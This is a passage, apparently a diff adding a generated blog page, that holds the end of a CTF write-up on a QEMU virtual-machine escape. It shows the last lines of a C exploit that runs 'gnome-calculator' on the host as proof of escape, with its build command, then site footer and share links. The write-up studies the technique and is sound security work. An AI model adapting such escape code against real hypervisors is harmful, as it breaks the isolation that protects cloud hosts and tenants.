command"</span>);</span><br><span class="line">    <span class="keyword">char</span> *commend=<span class="string">"gnome-calculator"</span>;</span><br><span class="line">    write_command(commend);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] Escape"</span>);</span><br><span class="line">    <span class="keyword">char</span> kirin=*base_addr;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc ./exp.c  -o exp  --static</span></span><br></pre></td></tr></table></figure>
+<p><strong>Escape successfully:</strong><br><img src="https://upload-images.jianshu.io/upload_images/7434375-9852a92121a27438.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="PWN"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyze"><span class="toc-number">2.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/&text=QEMU Escape in  Cloud Security Game" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/&title=QEMU Escape in  Cloud Security Game" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/&is_video=false&description=QEMU Escape in  Cloud Security Game" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=QEMU Escape in  Cloud Security Game&body=Check out this article: http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/&title=QEMU Escape in  Cloud Security Game" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/&title=QEMU Escape in  Cloud Security Game" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/&title=QEMU Escape in  Cloud Security Game" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/&title=QEMU Escape in  Cloud Security Game" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/&name=QEMU Escape in  Cloud Security Game&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
